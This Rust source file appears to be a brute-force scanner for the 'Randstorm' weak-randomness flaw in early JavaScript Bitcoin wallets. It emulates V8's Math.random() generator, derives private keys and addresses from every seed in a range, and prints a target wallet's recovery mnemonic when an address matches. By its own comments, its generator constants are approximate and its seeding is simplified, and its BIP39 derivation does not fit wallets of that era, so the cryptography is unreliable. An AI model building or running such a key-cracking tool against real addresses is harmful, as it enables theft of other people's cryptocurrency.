use anyhow::Result;
use bitcoin::bip32::{DerivationPath, Xpriv};
use bitcoin::secp256k1::Secp256k1;
use bitcoin::{Address, Network};
use std::str::FromStr;
use tracing::{info, warn};

/// Randstorm/BitcoinJS Vulnerability Scanner
///
/// Vulnerability: JavaScript Math.random() used for wallet entropy (2011-2015)
/// Affected: Blockchain.info, BitAddress.org, CoinPunk, BrainWallet.org, and others
/// Impact: 1.4M+ BTC potentially at risk (~$1 billion USD)
///
/// Technical Details:
/// - Early web wallets used JavaScript's Math.random() for key generation
/// - Math.random() uses weak PRNGs (not cryptographically secure)
/// - V8 (Chrome/Node.js) used MWC1616 (Multiply-With-Carry) algorithm
/// - Only 32 bits of state → 2^32 possible keys (4.29 billion)
/// - Expected: 256 bits → 2^256 possible keys
/// - Reduction: Astronomically weak (2^224 times weaker)
///
/// Attack Surface:
/// - V8 (Chrome/Node.js): MWC1616 PRNG (most common)
/// - SpiderMonkey (Firefox): Different PRNG
/// - JavaScriptCore (Safari): Different PRNG
/// - Chakra (IE/Edge): Different PRNG
///
/// CVE: None assigned (disclosed 2023 by Unciphered)
/// Reference: https://milksad.info/ (mentions Randstorm briefly)
///
/// IMPLEMENTATION STATUS: Foundation / MVP
/// Phase 1: V8 MWC1616 implementation (highest priority)
/// Phase 2: GPU acceleration
/// Phase 3: Other browser engines
pub fn run(target: Option<String>, start_state: Option<u32>, end_state: Option<u32>) -> Result<()> {
    info!("Randstorm/BitcoinJS Vulnerability Scanner");
    info!("Target PRNG: V8 MWC1616 (Chrome/Node.js 2011-2015)");
    info!("State space: 2^32 possible seeds");
    warn!("IMPLEMENTATION STATUS: Foundation / MVP (V8 MWC1616 only)");

    // Default: scan first 1 million states for testing
    let start = start_state.unwrap_or(0);
    let end = end_state.unwrap_or(1_000_000);

    info!("Scanning PRNG states {} to {}", start, end);
    if let Some(ref addr) = target {
        info!("Target address: {}", addr);
    } else {
        info!("No target specified, will generate addresses only");
    }

    // Phase 1: CPU implementation
    run_cpu(target.as_deref(), start, end)
}

/// V8 MWC1616 Multiply-With-Carry PRNG (used in Chrome/Node.js 2011-2015)
///
/// Algorithm: Multiply-With-Carry 1616
/// - Two 16-bit state variables (x, y)
/// - One carry bit (c)
/// - Total state: ~32 bits
///
/// Reference: V8 source code (historical)
#[derive(Debug, Clone)]
struct V8Mwc1616 {
    x: u32, // Lower 16 bits used
    y: u32, // Lower 16 bits used
    c: u32, // Carry
}

impl V8Mwc1616 {
    /// Create new MWC1616 PRNG from seed
    ///
    /// NOTE: This is a simplified implementation based on available documentation.
    /// The actual V8 seeding mechanism may have varied by version.
    /// Further research needed for production use.
    fn new(seed: u32) -> Self {
        // Simplified seeding: split 32-bit seed into two 16-bit parts
        let x = (seed & 0xFFFF) as u32;
        let y = ((seed >> 16) & 0xFFFF) as u32;

        // Ensure non-zero states
        let x = if x == 0 { 1 } else { x };
        let y = if y == 0 { 1 } else { y };

        Self { x, y, c: 0 }
    }

    /// Generate next pseudo-random value
    ///
    /// MWC algorithm:
    /// - x = (a * x_n + c) mod m
    /// - Extract new carry
    /// - Combine x and y for output
    ///
    /// Returns: [0.0, 1.0) floating point value (like JavaScript Math.random())
    fn next(&mut self) -> f64 {
        // MWC1616 constants (example values - need verification from V8 source)
        const A: u64 = 18000;
        const B: u64 = 30903;

        // Update x with carry
        let t_x = A * (self.x as u64) + (self.c as u64);
        self.x = (t_x & 0xFFFF) as u32;
        self.c = (t_x >> 16) as u32;

        // Update y
        let t_y = B * (self.y as u64) + (self.c as u64);
        self.y = (t_y & 0xFFFF) as u32;
        self.c = (t_y >> 16) as u32;

        // Combine x and y to produce 32-bit output
        let output = (self.x << 16) + self.y;

        // Convert to [0.0, 1.0) range
        (output as f64) / (1u64 << 32) as f64
    }

    /// Generate n bytes of "entropy" using Math.random() pattern
    ///
    /// This simulates the vulnerable code:
    /// ```javascript
    /// function generatePrivateKey() {
    ///     var bytes = new Uint8Array(32);
    ///     for (var i = 0; i < 32; i++) {
    ///         bytes[i] = Math.floor(Math.random() * 256);
    ///     }
    ///     return bytes;
    /// }
    /// ```
    fn generate_bytes(&mut self, count: usize) -> Vec<u8> {
        let mut bytes = Vec::with_capacity(count);
        for _ in 0..count {
            let rand_val = self.next();
            let byte_val = (rand_val * 256.0).floor() as u8;
            bytes.push(byte_val);
        }
        bytes
    }
}

/// CPU-based Randstorm scanner
fn run_cpu(target: Option<&str>, start_state: u32, end_state: u32) -> Result<()> {
    use bip39::Mnemonic;

    let secp = Secp256k1::new();
    let network = Network::Bitcoin;

    // Parse target address if provided
    let target_addr = if let Some(addr_str) = target {
        let addr = Address::from_str(addr_str)?;
        // Assume checked after parsing (we're scanning Bitcoin mainnet)
        Some(addr.assume_checked())
    } else {
        None
    };

    info!("Starting CPU scan (this may take a while)...");
    warn!("NOTE: V8 MWC1616 constants are approximations - further research needed");
    warn!("Production use requires validation against known vulnerable wallets");

    let mut checked = 0u64;
    let start_time = std::time::Instant::now();

    for state in start_state..=end_state {
        // Initialize PRNG with this state
        let mut rng = V8Mwc1616::new(state);

        // Generate 32 bytes of "entropy" (256 bits)
        let entropy = rng.generate_bytes(32);

        // Convert to BIP39 mnemonic (if valid)
        let mnemonic = match Mnemonic::from_entropy(&entropy) {
            Ok(m) => m,
            Err(_) => continue, // Invalid entropy, skip
        };

        // Derive addresses for common derivation paths
        let seed = mnemonic.to_seed("");
        let root = match Xpriv::new_master(network, &seed) {
            Ok(r) => r,
            Err(_) => continue,
        };

        // Check multiple derivation paths
        let paths = vec![
            "m/44'/0'/0'/0/0",  // BIP44 (most common)
            "m/0'/0/0",         // Some early wallets
            "m/0",              // Very early/simple derivation
        ];

        for path_str in &paths {
            let path = match DerivationPath::from_str(path_str) {
                Ok(p) => p,
                Err(_) => continue,
            };

            let child = match root.derive_priv(&secp, &path) {
                Ok(c) => c,
                Err(_) => continue,
            };

            let pubkey = child.to_keypair(&secp).public_key();

            // Generate P2PKH address (most common for 2011-2015 era)
            let address = Address::p2pkh(bitcoin::PublicKey::new(pubkey), network);

            // Check if matches target
            if let Some(ref target) = target_addr {
                if &address == target {
                    warn!("\n🎯 FOUND MATCH!");
                    warn!("PRNG State: {}", state);
                    warn!("Mnemonic: {}", mnemonic);
                    warn!("Path: {}", path_str);
                    warn!("Address: {}", address);
                    return Ok(());
                }
            } else {
                // No target, just log first few for verification
                if checked < 10 {
                    info!("State {} | Path {} | Address: {}", state, path_str, address);
                }
            }
        }

        checked += 1;
        if checked % 10000 == 0 {
            let elapsed = start_time.elapsed().as_secs_f64();
            let rate = checked as f64 / elapsed;
            info!(
                "Progress: {}/{} ({:.1}%) | Rate: {:.0} states/sec",
                state - start_state,
                end_state - start_state,
                100.0 * (state - start_state) as f64 / (end_state - start_state) as f64,
                rate
            );
        }
    }

    let elapsed = start_time.elapsed().as_secs_f64();
    info!("Scan complete!");
    info!("States checked: {}", checked);
    info!("Time elapsed: {:.2}s", elapsed);
    info!("Average rate: {:.0} states/sec", checked as f64 / elapsed);

    if target.is_some() {
        info!("No match found in scanned range");
    }

    Ok(())
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_v8_mwc1616_deterministic() {
        // Test that same seed produces same sequence
        let mut rng1 = V8Mwc1616::new(12345);
        let mut rng2 = V8Mwc1616::new(12345);

        for _ in 0..10 {
            let val1 = rng1.next();
            let val2 = rng2.next();
            assert_eq!(val1, val2, "Same seed should produce same sequence");
        }
    }

    #[test]
    fn test_v8_mwc1616_range() {
        // Test that output is in [0.0, 1.0) range
        let mut rng = V8Mwc1616::new(54321);

        for _ in 0..100 {
            let val = rng.next();
            assert!(val >= 0.0 && val < 1.0, "Output should be in [0.0, 1.0) range");
        }
    }

    #[test]
    fn test_generate_bytes() {
        // Test byte generation
        let mut rng = V8Mwc1616::new(99999);
        let bytes = rng.generate_bytes(32);

        assert_eq!(bytes.len(), 32);
        // Bytes should be deterministic
        let mut rng2 = V8Mwc1616::new(99999);
        let bytes2 = rng2.generate_bytes(32);
        assert_eq!(bytes, bytes2);
    }

    #[test]
    fn test_zero_seed_handling() {
        // Seed 0 should be handled (converted to non-zero)
        let rng = V8Mwc1616::new(0);
        assert_ne!(rng.x, 0);
        assert_ne!(rng.y, 0);
    }

    #[test]
    fn test_entropy_to_mnemonic() {
        // Test that generated entropy can be converted to mnemonic
        let mut rng = V8Mwc1616::new(11111);
        let entropy = rng.generate_bytes(32);

        let mnemonic = bip39::Mnemonic::from_entropy(&entropy);
        assert!(mnemonic.is_ok(), "Generated entropy should be valid for BIP39");
    }
}
